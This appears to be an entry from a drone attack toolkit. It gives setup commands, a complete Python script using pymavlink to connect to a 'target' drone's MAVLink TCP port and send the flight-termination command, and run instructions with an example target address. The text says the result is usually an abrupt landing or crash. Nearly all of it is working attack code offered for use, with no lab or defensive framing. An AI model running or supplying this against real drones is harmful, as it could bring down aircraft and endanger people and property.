    content: |
      The Flight Termination involves sending the a command to the drone causing it to immediately terminate its current flight operation. 
      This command instructs the drone to immediately stop its flight, usually resulting in an abrupt landing 
      or crash.

    steps:
      - title: Step 1. Setup
        description: |
          Ensure you have Python and the necessary libraries installed:
          ```sudo apt-get update
          sudo apt-get install python3 python3-pip
          pip3 install pymavlink
          ```

      - title: Step 2. Create the Script
        description: |
          Create a Python script named `flight_termination.py` and paste the following code:
          ```from pymavlink import mavutil
          import sys

          def connect_drone(target_ip, target_port):
              """
              Establish a connection to the drone.
              """
              master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
              master.wait_heartbeat()
              print("Connected to the drone.")
              return master

          def execute_flight_termination(master):
              """
              Send the MAV_CMD_DO_FLIGHTTERMINATION command to terminate the flight.
              """
              master.mav.command_long_send(
                  master.target_system,                # Target system ID
                  master.target_component,             # Target component ID
                  mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION, # Command ID for flight termination
                  0,                                   # Confirmation
                  1,                                   # Param1: 1 to initiate flight termination
                  0, 0, 0, 0, 0, 0                     # Other params unused
              )
              print("Flight termination command sent.")

          def main(target_ip, target_port):
              # Connect to the drone
              master = connect_drone(target_ip, target_port)

              # Execute the flight termination
              execute_flight_termination(master)

              # Optionally, monitor the drone's status
              while True:
                  msg = master.recv_match(blocking=True)
                  if not msg:
                      continue
                  print(f"Received message: {msg}")
                  if msg.get_type() == 'COMMAND_ACK':
                      if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
                          if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                              print("Flight termination command accepted.")
                          else:
                              print(f"Failed to execute flight termination command: {msg.result}")
                      break

          if __name__ == "__main__":
              if len(sys.argv) != 2:
                  print("Usage: python flight_termination.py <target_ip:target_port>")
                  sys.exit(1)

              target = sys.argv[1]
              target_ip, target_port = target.split(':')
              target_port = int(target_port)

              # Execute the script
              main(target_ip, target_port)
          ```

      - title: Step 3. Run the Script
        description: |
          Execute the script with sudo and the target IP and port of the drone:
          ```sudo python flight_termination.py (IP:PORT)
          ```
          Replace `(IP:PORT)` with the actual IP address and port of the drone, for example `10.13.0.3:5760`. The script will send the flight termination command, which will immediately stop the drone's flight.
